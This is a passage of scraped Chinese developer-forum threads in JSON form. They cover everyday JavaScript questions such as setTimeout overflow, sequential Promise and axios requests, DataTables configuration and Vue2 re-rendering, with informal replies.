{"content": ["<div class=\"topic_content\">&lt;input type=\"text\" name=\"\"  id=\"\" value=\"\"&gt;\r<br> \r<br>&lt;script type=\"text/javascript\"&gt;\r<br>/*\r<br>\t[Discuz!] (C)2001-2099 Comsenz Inc.\r<br>\tThis is NOT a freeware, use is subject to license terms\r<br>\r<br>\t$Id: common_extra.js 35188 2015-01-19 04:22:32Z nemohou $\r<br>*/\r<br>\r<br>\r<br>function _showselect(obj, inpid, t, rettype) {\r<br>\tvar showselect_row = function (inpid, s, v, notime, rettype) {\r<br>\t\tif(v &gt;= 0) {\r<br>\t\t\tif(!rettype) {\r<br>\t\t\t\tvar notime = !notime ? 0 : 1;\r<br>\t\t\t\tvar t = today.getTime();\r<br>\t\t\t\tt += 86400000 * v;\r<br>\t\t\t\tvar d = new Date();\r<br>\t\t\t\td.setTime(t);\r<br>\t\t\t\tvar month = d.getMonth() + 1;\r<br>\t\t\t\tmonth = month &lt; 10 ? '0' + month : month;\r<br>\t\t\t\tvar day = d.getDate();\r<br>\t\t\t\tday = day &lt; 10 ? '0' + day : day;\r<br>\t\t\t\tvar hour = d.getHours();\r<br>\t\t\t\thour = hour &lt; 10 ? '0' + hour : hour;\r<br>\t\t\t\tvar minute = d.getMinutes();\r<br>\t\t\t\tminute = minute &lt; 10 ? '0' + minute : minute;\r<br>\t\t\t\treturn '&lt;a href=\"javascript:;\"  onclick=\"$(\\'' + inpid + '\\').value = \\'' + d.getFullYear() + '-' + month + '-' + day + (!notime ? ' ' + hour + ':' + minute: '') + '\\'\"&gt;' + s + '&lt;/a&gt;';\r<br>\t\t\t} else {\r<br>\t\t\t\treturn '&lt;a href=\"javascript:;\"  onclick=\"$(\\'' + inpid + '\\').value = \\'' + v + '\\'\"&gt;' + s + '&lt;/a&gt;';\r<br>\t\t\t}\r<br>\t\t} else if(v == -1) {\r<br>\t\t\treturn '&lt;a href=\"javascript:;\"  onclick=\"$(\\'' + inpid + '\\').focus()\"&gt;' + s + '&lt;/a&gt;';\r<br>\t\t} else if(v == -2) {\r<br>\t\t\treturn '&lt;a href=\"javascript:;\"  onclick=\"$(\\'' + inpid + '\\'). onclick()\"&gt;' + s + '&lt;/a&gt;';\r<br>\t\t}\r<br>\t};\r<br>\r<br>\tif(!obj.id) {\r<br>\t\tvar t = !t ? 0 : t;\r<br>\t\tvar rettype = !rettype ? 0 : rettype;\r<br>\t\tobj.id = 'calendarexp_' + Math.random();\r<br>\t\tdiv = document.createElement('div');\r<br>\t\tdiv.id = obj.id + '_menu';\r<br>\t\tdiv.style.display = 'none';\r<br>\t\tdiv.className = 'p_pop';\r<br>\t\t$('append_parent').appendChild(div);\r<br>\t\ts = '';\r<br>\t\tif(!t) {\r<br>\t\t\ts += showselect_row(inpid, '一天', 1, 0, rettype);\r<br>\t\t\ts += showselect_row(inpid, '一周', 7, 0, rettype);\r<br>\t\t\ts += showselect_row(inpid, '一个月', 30, 0, rettype);\r<br>\t\t\ts += showselect_row(inpid, '三个月', 90, 0, rettype);\r<br>\t\t\ts += showselect_row(inpid, '自定义', -2);\r<br>\t\t} else {\r<br>\t\t\tif($(t)) {\r<br>\t\t\t\tvar lis = $(t).getElementsByTagName('LI');\r<br>\t\t\t\tfor(i = 0;i &lt; lis.length;i++) {\r<br>\t\t\t\t\ts += '&lt;a href=\"javascript:;\"  onclick=\"$(\\'' + inpid + '\\').value = this.innerHTML;$(\\''+obj.id+'_menu\\').style.display=\\'none\\'\"&gt;' + lis[i].innerHTML + '&lt;/a&gt;';\r<br>\t\t\t\t}\r<br>\t\t\t\ts += showselect_row(inpid, '自定义', -1);\r<br>\t\t\t} else {\r<br>\t\t\t\ts += '&lt;a href=\"javascript:;\"  onclick=\"$(\\'' + inpid + '\\').value = \\'0\\'\"&gt;永久&lt;/a&gt;';\r<br>\t\t\t\ts += showselect_row(inpid, '7 天', 7, 1, rettype);\r<br>\t\t\t\ts += showselect_row(inpid, '14 天', 14, 1, rettype);\r<br>\t\t\t\ts += showselect_row(inpid, '一个月', 30, 1, rettype);\r<br>\t\t\t\ts += showselect_row(inpid, '三个月', 90, 1, rettype);\r<br>\t\t\t\ts += showselect_row(inpid, '半年', 182, 1, rettype);\r<br>\t\t\t\ts += showselect_row(inpid, '一年', 365, 1, rettype);\r<br>\t\t\t\ts += showselect_row(inpid, '自定义', -1);\r<br>\t\t\t}\r<br>\t\t}\r<br>\t\t$(div.id).innerHTML = s;\r<br>\t}\r<br>\tshowMenu({'ctrlid':obj.id,'evt':'click'});\r<br>\tif(BROWSER.ie &amp;&amp; BROWSER.ie &lt; 7) {\r<br>\t\tdoane(event);\r<br>\t}\r<br>}\r<br>\r<br>&lt;/script&gt;</div>"], "reply": "1", "tittle": "怎么让 input 显示一周后时间", "comment": ["new Date().getTime() += 1000*3600*24*7;"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>也做一次伸手党吧，\n目前正在学习 JavaScript ，想让大家推荐这种 <strong>小而美</strong> 的 js 代码（库或者插件什么的，主要是代码风格好一点吧，这个我觉得对新手影响还是较大的），主要是看看源码学习下，提升下自己吧！</p>\n<p>上回在 GitHub 上看到有人有类似的项目，自己阅读代码然后写上注释之类的，但是找不到那个同学的地址，\n所以在这求推荐一下吧，感谢！</p>\n</div></div>"], "reply": "7", "tittle": "求推荐下好点的 JavaScript 代码", "comment": [" 这个不错", " 你说的是这个？\r", "前端的话可以看看 zepto.js", "codepen.io", " 感谢啊，我去看看", " 对，类似的，我上会看得不是这个，不过都是差不多，感谢啊", " 感谢，我去看一看"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>setTimeout(\"alert('ok');\",1580870100); \nsetTimeout(\"alert('ok1');\",15808701000);//这条会立即执行\nsetTimeout(\"alert('ok');\",1580870100000);\n</code></pre>\n</div></div>"], "reply": "12", "tittle": "遇到一个 Js 定时器的坑,哪位大神知道是什么原因？", "comment": ["定时器本来就不会按顺序执行的。\r", "定时器只是将任务派发给异步事件管理器，什么时候执行按什么顺序执行是不确定的", "第二个时间太大崩了？ 崩溃了之后直接执行？", "超过 32bit 的最大数字了，会归一，源码就是这么写的。\r", "\r", "// Timeout values > TIMEOUT_MAX are set to 1.\r", "var TIMEOUT_MAX = 2147483647; // 2^31-1", "  那第三条也会归一吗，为什么第三条不显示？", "官方文档也有说明的: ", " 然而 1580870100000 为啥没有立即执行，百思不得姐", " @", " 原因应该是这样的:\r", "// 以前是这么处理 delay 时间的\r", "delay = delay & 2147483647\r", "\r", "// 现在是这么处理 delay 时间的\r", "if (delay > 2147483647) {\r", "  delay = 1\r", "}", " @", " 貌似说反了~~~", " 这也说不通啊", " Node.js 里是大于 2147483647 就强行改为 1. Chrome/Firefox 还没找到...\r", "\r", "见: ", " 测试下来, 浏览器是先 delay & 0x0ffffffff 处理 delay 时间.\r", "\r", "15808701000 处理后是一个负数(1371168184), 所以会被立即执行.\r", "1580870100000 处理后是正数 322135072, 本质上还会有延迟.\r", "\r", "所以: setTimeout(function () {console.log('expect 1')}, Math.pow(2, 32) + 5000) 还是延迟 5 秒执行"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>if (window.DeviceOrientationEvent) {\nwindow.addEventListener('deviceorientation', function hd(eventData) {\nd =eventData.gamma;\nwindow.removeEventListener('deviceorientation',hd,false);\n},false);\n}</p>\n<p>怎么让全局使用呢</p>\n</div></div>"], "reply": "6", "tittle": "event listener 里的变量怎么变成全局变量", "comment": ["办法一，在事件函数的外面，也就是全局位置进行声明。", "办法二， window.foo = bar;", "直接赋值，不用 var 的话，好像是全剧的，但是感觉不是很优雅。", "用闭包即可，一楼方法也可以\r", "(function(window){\r", "return function hd(eventData) { \r", "d =eventData.gamma;\r", "window.removeEventListener('deviceorientation',hd,false);\r", "}})()", " 可以在在全局先声明 d 变量，但 event listener 的事件不会更新 d 的内容。这点让我头疼。", " 测试不行呀。还有别的方法吗", " 写掉了，最后一个括号里面是 window"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>\nwindow.weChatConfTables = $(\"[data-table-name='businessmenManagerTable']\").DataTable({\n    serverSide: true,\n    ajax: {\n        url: ctxPath + \"/admin/businessmenManagerAjax\",\n        type: \"POST\"\n    },\n    columns: [{\n        data: \"id\",\n        title: \"id\",\n        visible: false\n    }, {\n        data: \"appId\",\n        title: \"公众账号 ID\",\n        width: \"6%\"\n    }, {\n        data: \"key\",\n        title: \"支付密匙\",\n        width: \"6%\"\n    }, {\n        data: \"mchId\",\n        title: \"商户号\",\n        width: \"6%\"\n    }, {\n        data: \"hAppSecret\",\n        title: \"服务号密匙\",\n        width: \"6%\"\n    }, {\n        data: \"orders\",\n        title: \"优先级\",\n        width: \"2%\"\n    }, {\n        data: \"merchantName\",\n        title: \"商户名字\",\n        width: \"6%\"\n    }, {\n        data: \"quota\",\n        title: \"总充值限额\",\n        width: \"6%\"\n    }, {\n        data: \"nowMoney\",\n        title: \"已充值额度\",\n        width: \"6%\"\n    }, {\n        data: \"status\",\n        title: \"状态\",\n        width: \"3%\"\n    }, {\n        data: \"\",\n        title: \"操作\",\n        width: \"3%\"\n    }]\n});\n\n</code></pre>\n<p>最后发送 HTTP 请求居然为这样,如图:</p>\n<p><img alt=\"\" src=\"http://ww1.sinaimg.cn/large/e38a7f8bgy1fe9ed3jd9ij20ms0h2gng.jpg\"></p>\n<p>何解呢?</p>\n</div></div>"], "reply": "19", "tittle": "datables 服务器模式 求助", "comment": ["come on   来位小伙伴拯救我吧......痛苦中 \r", "鲍照求助\r", "\r", "![]( ", " )", "桌面太乱, 差评", "就屏幕好看，背景好猥琐…", "  桌面再乱也不如我心乱", "就是这样的，表示 columns 是一个数组，里面包含了这 11 个对象。你想要改成什么样子呢？", "支架在哪买的？", "   ==发送的应该是定义的 data 哇", " 某东搜索乐歌（ Loctek ） D7D   1499.00 RMB 那款", "此问题我遇到过。。。但是 我忘记我咋解决了。。。", "看看你返回的 json 默认要把数据放到一个名为 data 的 json 对象里", " 这个是请求哇 不是 返回的  = =", "你发的是对象，改为 json 吧", "桌面太乱，差评", "手动 JSON.stringify 即可。。。自动的转换有层数限制", "别人是来问问题的...咋关注点都偏了", "先把数据`JSON.stringify()`一下  接到后`JSON.parse()`一下", "这种问题可能还是 stackoverflow 好一点。", "是因为 column 没有 name 属性么。。。。", "  不是...."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>var href=location.href;\nfunction defaulturl() {\nhistory.replaceState(null,null,href);\nlocation.hash='#';\n}\nfunction newurl() {\nhistory.replaceState(null,null,location.protocol+'//'+location.host+location.pathname);\nlocation.hash='#Have fun!';\n}\nfunction lostblur() {\nwindow.onblur=function () {\nsetTimeout(defaulturl,10);\n};\n}\nnewurl();\nlostblur();\nwindow.onfocus=function () {\nlostblur();\nsetTimeout(newurl,10);\n};\nwindow.oncontextmenu=function () {\nwindow.onblur=null;\ndefaulturl();\n};\nwindow.onkeyup=function () {\nif (event['keyCode'] == 116) {\nwindow.onblur=null;\nwindow.onfocus=null;\ndefaulturl();\n}};\nwindow.onbeforeunload=function () {\nwindow.onblur=null;\nwindow.onfocus=null;\ndefaulturl();\n};\n</code></pre>\n<p>其中出问题的部分是：</p>\n<pre><code>window.onbeforeunload=function () {\nwindow.onblur=null;\nwindow.onfocus=null;\ndefaulturl();\n};\n</code></pre>\n<p>这段代码在我的浏览器上看已经生效了，但是刷新的时候仍然是使用原来的 URL 导致页面不正确。 按 F5 则是生效的，之前研究并加了</p>\n<pre><code>window.onkeyup=function () {\nif (event['keyCode'] == 116) {\nwindow.onblur=null;\nwindow.onfocus=null;\ndefaulturl();\n}};\n</code></pre>\n<p>绑定F5后快捷键刷新才可用，但是点击刷新按钮仍不行。\n兼容浏览器是IE9+ / Chrome / Firefox\n希望用这段JS代码达到的效果是：\n在页面范围内，且页面是焦点，将URL参数隐藏，并将锚点设为#Have fun!。\n在非焦点（复制URL，收藏等） / 点击刷新按钮 / F5刷新页面 / 打开右键菜单（创建快捷方式 / 打印）时恢复原URL。</p>\n</div></div>"], "reply": "4", "tittle": "写了个 JavaScript，但是事件不生效。", "comment": ["试着用过 mouseout 之类的，不能得到页面区域外的位置。\r", "beforeunload 则是 URL 修改成功，但是刷新时还是用原来的 URL 刷新，从而无效。。", "然后目前没有实现的只有点击刷新按钮了，其它的全部看起来没问题了。。", "顺便再问个问题：\r", "像这种贴，有对应的节点，问问题是发到对应节点还是发问与答好...", "然后问了挺久 只能用 mousemove 让在页面上移动时有效 停留 0.5 秒恢复原 URL"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>为之前搞的工具库写了一个在线生成工具：<a href=\"http://eustia.liriliri.io/builder.html\" rel=\"nofollow\">http://eustia.liriliri.io/builder.html</a>，可以直接输入模块名生成只包含所需模块及其依赖模块的定制化 util 库。</p>\n<p>该库目前拥有大约两百个模块，包括 Dom 操作， cookie 设置，类创建，模板函数，日期格式化等实用模块，可极大提高移动端开发效率，欢迎试用提建议:)</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "在线 Util 库生成工具", "comment": []},
{"content": ["<div class=\"topic_content\">firefox 写个 UC 脚本方便阅读车牌\r<br>for (i in list) {\r<br>for (j in nodes) { }\r<br>}\r<br>\r<br>i 总是只跑一遍就结束，第二个值开始总是无效\r<br>然后研究了半天\r<br>改成\r<br>for (j=0; j&lt;nodes.length; j++) 就跑通了\r<br>但是刚开始时改 i 不改 j 也不通，坑我忽略了要改内循环这点</div>"], "reply": "14", "tittle": "一个坑，坑了半天时间", "comment": ["不知所云", "没明白", " \r", " \r", "1.内、外循环都用 for...in ，跑不通\r", "2.外循环 for.. 内循环 for...in ，也跑不通\r", "3.外循环 for..in 内循环 for...，可以跑通\r", "\r", "开始时按 2 改了，不通，就以为不是循环问题，去测试其他语句问题了，没想到几个小时后改成 3 ，就通了……", "for...in 本来就不出处理数组的，你自己乱写怪谁..", "for of", "处理数组用 for...of ，处理 object 用 for...in ，不要乱用，会坑死自己的。", " \r", " \r", "非职业水平，脚本只写给自己用的，多多包容\r", "\r", "之前都想过这个， list 是 json 的列表， nodes 是 getElements ，查错时用 typeof 看过两个都是 obj", "可怕的头像", " typeof [] 试试。不要太相信 typeof 。", "想要写点什么才发现 V2EX 连个富文本编辑器，连 syntax highlighter 都没有", " #7 请使用 instanceof", " 请用 Object.prototype.toString.call()方法来判断。", "phper 路过， 楼上说的有点高级， 我们一般只用 each 和 普通 for", "通过 DOM API 得到的一般是个 NodeList ，提供了一个 forEach 方法可以用来迭代\r", "```javascript\r", "document.querySelectorAll(...).forEach(callback)\r", "```"]},
{"content": ["<div class=\"topic_content\">我现在有个这样的需求，前端页面要循环向服务器发起请求，一个请求结束后再发起下一次，直到循环条件结束。为的是缩短服务器每次处理数据时间，并及时的让客户端逐步看到处理结果，以前用 jquery 做，无非就两个方案： 1.aysnc 改成 false 变成同步请求， 2.递归调用，非常丑陋。现在弃用了 jquery ，用的 axios,这个库没法进行同步请求。那该怎么办，只有递归一条路了吗？</div>"], "reply": "24", "tittle": "如何用 js 优雅的在前端实现循环多次向后端的 ajax 请求，且这些 ajax 是按顺序发起的", "comment": ["只能递归啊。丑不丑还不是看你写法", "axios 本身基于 promise 你怎么让他同步 加了 async 写的好看但是还是要 babel\r", "所以最简单的办法还是一开始就用 promise", "这不叫递归啊～", "对了，如果你会用英文搜索的话，你会发现有一种优雅的写法可以像 Promise.all 一样让一个数组的 promise 按顺序执行，而且不用自己串链子\r", "\r", "问题是好像这个方法用的是 reduce 方法，一样需要 polyfill", "Promise", "let req = axois.request(...).then(业务逻辑).then( () => req );\r", "req();\r", "\r", "思路大概如此，或许有点小问题，自己试试。", "上 babel ， async await", "websocket 会不会是更好的方案？", "对啊，我也觉得上 socket", "写聊天程序？长轮询？这个很常见吧，异步回调而已，不算递归，没有那么高大上", "1 、就用递归的写法（纯函数式语言的标准写法啊，不丑的）\r", "即：每次只处理第一个 promise ，处理后把数组的其它部分作为新数组递归执行，直到全部完成\r", "2 、 async/await\r", "类似于：\r", "```\r", "async function main(promises) { // promises 是一个 promise 数组\r", "    let result = 0;\r", "    for(let promise of promises) {\r", "        result += await promise;\r", "    }\r", "    return result;\r", "}\r", "```\r", "3 、和后端商量下用 websocket 推数据给你（现在轮询的方式很落后了吧）。", " 条件不允许上 websocket", " \r", " \r", "谢谢，正在研究改造成 promise ，环境暂时不允许用 async", "Rx.Observable.from(...)\r", ".flatMap(source => fetch(source), 1)\r", ".subscrible()", "支持#15\r", "\r", "把 Promise 转成 Observable ，然后用 rxjs/repeatproto 来重复执行\r", "\r", "转 rx 是个办法但侵入性太强，其实你用 promise 或 callback 的话直接找个 async 库做下 series 封装就行了\r", "async 库就解决了...", "自荐一个类似的 async 库： ", "\r", "\r", "：）", "这是一个流程控制库 ", "不用库就可以有优雅的写法：\r", "[promiseFn1, promiseFn2,promiseFn3].reduce((promise, fn)=>{\r", "  return promise.then(fn);\r", "},promiseFn0() );", "```\r", "function each (promises, cb) {\r", "  return promises.reduce((promise, task, i) => {\r", "    return promise.then(_ => task).then(_ => cb(_, i))\r", "  }, Promise.resolve())\r", "}\r", "```\r", "\r", "用法和 bluebird 的 each 一样。\r", "ref: ", "感觉 websocket 才是正解。", "若愿意使用 ES6:\r", "\r", "\r", "\r", "若只用 ES5:\r", "\r", "\r", "总之是使用 Promise\r", "\r", "Promise 已经成为规范了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>举个例子， Apple 站点页面底部的「常见问题解答」：\n<a href=\"http://www.apple.com/cn/shop/buy-iphone/special-edition-iphone-7\" rel=\"nofollow\">http://www.apple.com/cn/shop/buy-iphone/special-edition-iphone-7</a></p>\n<p>点击后展开，出现许多小问题，每个小问题点击展开。</p>\n<p>需要的效果：像每个小问题那样的展开动效。但 + 号和 x 号需要像最大的「常见问题解答」那样的样式和旋转动画。</p>\n<p>应用在 WordPress 文章页面（内容太多了，希望能收起）。</p>\n<p>搜索了一些资料，并模仿了 <a href=\"http://Apple.com\" rel=\"nofollow\">Apple.com</a> 的 CSS ，但有许多小问题，例如 + 号不能恒久显示在正确的位置、+ 号无法旋转 45 度等。</p>\n</div></div>"], "reply": "6", "tittle": "如何在 WordPress 页面上实现点击一个标题展开／关闭其下文字？", "comment": ["wp 的模板很多都能实现，我记得这效果有短代码的", "display:none", "这东西 不是最简单的折叠面板或者折叠菜单吗？说的这么复杂。。。\r", "你自己模仿，，那么相关 js 有加载？ \r", "\r", "bootcss 就有现成的  ", "  自己根据替换修改为你想要的动态效果就行。", "搜索 终极简码 这个插件，应该是你想要的", " 感谢，要调整一些样式还是蛮不简单的，有很多差别。另外， CSS 的 transition 貌似比 jQuery 顺滑很多……", " 感谢，不过这些样式都挺奇怪的，其实最重要的还是样式。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在添加的时候还好，去数据库判断下，不过在编辑的时候，如果触发了那个字段就会将字段和数据库里的判断，有什么办法可以解决啊！试了下好像他的远程判断 ajax 只发送那个字段。</p>\n</div></div>"], "reply": "2", "tittle": "Validate 验证重复性的问题！", "comment": ["如果是编辑验证重复的话..要带着 ID 才行吧..", "  我也觉着 但是他好像只发那个字段。，难道要改源码。"]},
{"content": ["<div class=\"topic_content\">我估计应该是我想的方向不太对，放狗了好久也没找到答案。实际效果并不复杂，页面上有一个按钮和一个简单的数字 v-text ，点击按钮，按钮绑定的方法会把一个变量累加 n 次，要求每累加一次，页面就更新一次并显示出来，然而实际操作发现不行，按钮绑定的 method 会把 n 一次累加完，然后页面才会刷新显示出来，因此我看不到累加过程，只能看到最终结果，最开始发现 Vue2 有一个$forceUpdate()方法能强制刷新，但是实际使用毫无效果</div>"], "reply": "35", "tittle": "在 Vue2 里如何实现“一边计算，一边更新页面元素”这样的功能", "comment": ["既然想看到过程，就加上 setTimeout 啊", " 看看这个", " 你是对的，也就是说如果我想看到过程，就必须设置成异步任务，让 Vue 的处理 method 函数结束才行", " 谢谢，但是这个不是我要的，我并不是需要一个过渡效果，而是需要计算的过程", "那为什么要交给 VUE 去做呢， vue 的计算属性是类似于表达式公式的，用自己的方法异步完成不好么，构造自动机自动执行输出结果如何？\r", "\r", "我认为这种东西不要依赖框架。", "这不就是双向数据绑定吗，为什么直接更改会无效？楼主可以把示例发出来看看。", "Batch Update 机制，可通过异步操作解决", " \r", "大概是这个意思吧\r", "如果在方法中\r", "const setNumber=()=>{\r", "data.s=1;\r", "data.s=2;\r", "data.s=3;\r", "}\r", "方法执行后绑定的 s 属性显示的是 3 ，而 po 希望 显示出 1,2,3 这样？", " 我估计可能是需要异步，我以前以为可以在 Vue 的 method 定义的函数中同步实现。", " 代码如下，我估计我个人还是没理解 Vue 的思路造成的，或者 Vue 并不允许在定义的函数结束前进行 re-render\r", "\r", " <div id=\"group-send-sms\">\r", "\r", "    <span v-text=\"bianliang\"></span>\r", "    <input v-on:click=\"test\" type=\"button\" value=\"测试\" />\r", "\r", "\r", "\r", "  </div>\r", "\r", "<script type=\"text/javascript\">\r", "  var vm = new Vue({\r", "    el: \"#group-send-sms\",\r", "    data: {\r", "\r", "      bianliang:0,\r", "    },\r", "    computed: {\r", "      \r", "    },\r", "    methods: {\r", "      add:function(){\r", "        this.bianliang += 1;\r", "      },\r", "       //点击按钮，循环 100 次，每次都渲染到页面上去\r", "      test: function () {\r", "        for(var i=0;i<100;i++){\r", "          this.bianliang += 1;\r", "          this.$forceUpdate();        //这个强制渲染是无效的，并不能让循环中 bianliang 的改变立即出现在页面上\r", "        }\r", "\r", "      },\r", "    },\r", "\r", "  });\r", "\r", "</script>", " 其实我现在的问题是，为啥这个地方就必须是异步的呢？", " 你说的对，这就是我要的效果，实际的需求比这复杂的多，我只是抽象出了最简单的模型，总之就是，每次运算后立即刷新结果到页面上去，这个过程是链式过程，计算->刷新->计算->刷新->计算->刷新->......同步阻塞", "你这个代码，没有时间怎么看得出来，这种一瞬间计算的东西就算是浏览器处理也是一瞬间的事情，你需要用动画的方式去处理，用 generator 或者 setTimeout （我感觉 setTimeout 太麻烦了）\r", "\r", "<div id=\"test\"></div>\r", "    <script>\r", "    function test() {\r", "        var node = document.getElementById('test');\r", "        for(let a = 0 ; a < 100 ; a ++) {\r", "          node.innerHTML = a;\r", "        }\r", "    }\r", "    </script>\r", "\r", "你试试这段代码就知道，这种计算就是瞬间完成的。所以你需要使用异步去展示这段效果。", " 这个变量命名满分……\r", "\r", "我写了个 jsfiddle ，实际上$forceUpdate 是有效的，只是变量一下子从 0 到 100 ，中间没有间隔，看不出来变化而已。\r", "\r", "具体你可以看看[jsfiddle]( ", ")", "这难道不该用$nextTick 么， lz 的目的就是计算一次显示一次吧， async 写法把这个加入循环就好了", " 在极短时间内多次修改一个变量大多数时候是「与界面无关」的，如果这时候频繁操作 DOM 则会降低渲染效率。\r", "另一方面即使没有 Batch Update 机制，你这样在一个事件循环没多次操作 DOM 的做法也会被浏览器优化为一次渲染，而不会全部把过程显示出来。", " 你这个想法大体是没有问题的，但有两点，第一点非异步代码在执行完之前是不会刷新 dom 的，第二点电脑计算太快了，大多数显示器的刷新频率只有 60fps ，也就是每帧 16 毫秒， 16 毫秒内所做的任何改变你都是看不到的，会在下一帧才输出，可以去了解一下 requestAnimationFrame", "不用 setTimeout 还想用什么……\r", "\r", "// 禁止点击按钮的代码放这里\r", "let update = (n) => {\r", "if (n == 0) {\r", "// 允许点击按钮的代码放这里\r", "return;\r", "}\r", "// 更新视图的代码放这里\r", "setTimeout(() => update(n - 1), 200);\r", "}\r", "\r", "根本就没 vue 什么事，它只负责显示。要什么效果，是你自己实现。不要以为用了框架，就什么都要框架帮你做。", " 变量名是我随便弄上去的，本身就是测试用的不要在意，其次谢谢你的范例， setTimeout 用的比我好。话说作为一个后端要理解 js 的箭头函数感觉好难啊。最后就是，其实你这个范例证明了我的判断，你可以把$forceUpdate 去掉，你就会发现，仍然会更新，因此不是$forceUpdate 本身在起效，而是异步过程在起效。这也证明了我的想法， Vue 似乎没办法在一次函数调用中 forceUpdate ，必须离开这个函数调用范围", "计算一次 $nextTick 一次试试呢", " 就从文档上来说，没看出 nextTick 这个方法要怎么用在我这种场景", " 难道就没有一种机制强制浏览器刷新 dom 吗", " \r", "不要用后台那套来看前台，就算可以，那么意味着这套操作执行很慢，然后如果各相同种操作呢，这只是更新页面而已，还不够复杂，工作量再大一点用户直接崩溃了。\r", "\r", "实际上是你需要让动画堵塞-执行-堵塞，看看 async 和 generator 应该能解决。", " 其实我奇怪的是这一点， 60 帧那个问题很好理解，我有做过游戏开发，但是“非异步代码执行完前不能刷新 Dom ”这点，是为什么呢，是浏览器机制限制？ JavaScript 语言机制限制？因为我以前开发游戏的时候，某些引擎是可以在同步代码里强制刷新当前帧的", " #24 Vue.js 在一次 tick 中操作一次 dom （ diff, update ...），框架就是这么设计的。如果你非要即时刷新 dom ，你就直接操作 dom （ e.g. `node.innerHTML = xxx`），但是上面的同学都提到了，这个计算很快，你是看不到变化过程的。如果你是按照 Vue.js 的套路来玩的话，要做的事情就是让这个变量以一定间隔变化（不能太快），反映到视图上就是一个变化的“动画”过程。", " #24 ", " #14 为什么要用 $forceUpdate 呀。。本身就是双向绑定的。。改变 data 就直接改变 view 层了诶。。（实测不用 $forceUpdate 也可以的", "\r", "楼主看看这里吧", "看看异步更新队列那一节", " 非异步代码执行完前不能刷新 dom 这点是现在浏览器共同的做法， dom 重绘的开销非常大，所以在一段非异步代码内所有的 dom 操作只有在这段代码结束后才会渲染，目前并没有浏览器提供在当前强制重绘的接口，因为没有意义， js 是单线程的，你想把每次修改都反应出来又不想阻塞主进程，那就只能把所有操作都写成异步的，但即使异步中每次操作都修改了 dom 浏览器也不会马上刷新，也会等到下一个 frame 才重绘，如果你只是不想写 setTimeout 或者回调嵌套的话就用 async 直接把异步按照同步的方法来写。", "实际上你修改了 他就会刷新啊，只要你加上间隔，让人眼可见不就可以了吗？这个和 vue 也没啥关系。", "Javascript 是单线程，计算方法没有退出之前 UI 是没机会更新的", " js 里面还是可以强制同步重新渲染的 ", "现在好多前端框架主要就是解决这个问题来提供渲染性能的，你是逆行，可行的方法每加 1 就要手动更新一次 dom", "大哥，你对 n 的操作是同步的吧？？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>求助各位大神，移动端如何用 js 实现返回之前的页面后 回到之前的位置，而不是自动跳回页面顶部！</p>\n</div></div>"], "reply": "5", "tittle": "小白求助 js 如何回到页面之前的位置", "comment": ["history.go(0)", "手快\r", "history.go(-1)", "还是有个疑问，可能没理解透，按手机的返回键返回而不是点击控件返回，这个 history.go(-1)该写到哪里呢？", "按手机返回，自动回到之前位置", "感谢回复,可能是我页面跳转没做好吧!"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>只能修改源码吗？</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "Validate 的验证 name 是 name[] 这种的如何验证？", "comment": []},
{"content": ["<div class=\"topic_content\">Promise 能像下面这样顺序完成链式异步任务\r<br>\r<br>promise1().then(function(data) {\r<br>\t\tconsole.log(data);\r<br>\t\treturn promise2();\r<br>\t})\r<br>\t.then(function(data) {\r<br>\t\tconsole.log(data);\r<br>\t\treturn promise3();\r<br>\t})\r<br>\t.then(function(data) {\r<br>\t\tconsole.log(data);\r<br>\t\treturn '结束了吧'\r<br>\t}).then(function(data) {\r<br>\t\tconsole.log(data);\r<br>\t});\r<br>}\r<br>但是这里存在一个问题， promise2 和 promise3 都必须是在外部预定义好的。\r<br>\r<br>但是现在我有这么一个需求，我可能有一大批 promise 对象，这些 promise 对象都是按一定算法用循环生成的。结果这就遇到了坑，我试图这么干\r<br>\r<br>function axiosLoop(index) {\r<br>    /*\r<br>    XXXXXX\r<br>    */\r<br>    return axiosObj;\r<br>}\r<br>var objTemp = null;\r<br>for (var i = 0; i &lt; 10; i++) {\r<br>    objTemp = axiosLoop(i).then(function (data) {\r<br>        console.log(data);\r<br>        return axiosLoop(i+1);  //这么干是不行的，因为这个 i 值是引用外部的 i ，它会直接演变成最大的 10\r<br>    }).catch(function (error) {\r<br>        console.log(error);\r<br>    });\r<br>}\r<br>\r<br>=========\r<br>我该怎么解决这个问题，这个问题不能使用类似 promis.all()来执行，因为我一定要保证有序执行</div>"], "reply": "13", "tittle": "求教，如何使用 promise 完成循环状态下的链式异步任务", "comment": ["再包一层\r", "objTemp = axiosLoop(i).then((function (idx){\r", "        return function(data){\r", "            console.log(data);\r", "            return axiosLoop(idx);\r", "        }\r", "    })(i+1)).catch(function (error) {\r", "        console.log(error);\r", "    });", "<script src=\"", ".js\"></script>", " 跟我第一感一样。用闭包。", "支持 ES6 的话，把 for 里面的 var 改成 let 。", "为何不用 async/await ？", "比较脏难维护和扩展，但能解燃眉之急的方案：引 deasync 包，把请求封装成一个同步方法。\r", "需要额外学习、要求特定 nodejs 版本或使用编译工具，但优雅稳定的方案： async/await 。", " \r", " \r", " \r", "谢谢楼上各位，奋斗了一晚上，终于在重新理解 promise 模型和闭包变量作用域的基础上，按照 freeminder 的方法搞定了。折腾死了，我终于明白为啥 Promise 仅仅出来了两年就被 async/await 干掉了， 12 万分的希望 async/await 早日在前端普及吧，再也不想拿 Promise 写东西了", "可以用 reduce 来， arr.reduce((promise, item) => { return promise.then(() => asyncReq(item)), asyncReq1()}", "[p1,p2,p3].reduce((seq,next) => seq.then(value=>next()), Promise.resolve())\r", "\r", "说白了有点像 x = x + n\r", "你看啊： seq = seq.then(value => task(value)\r", "是不是很像", " Promise 活的好好的，没被干掉吧。\r", "嫌原生 Promise 不好用可以试试 bluebird 。", " \r", " 说的很对， Promise 并没有“被” async/await 干掉，相反， async/await 是基于 Promise 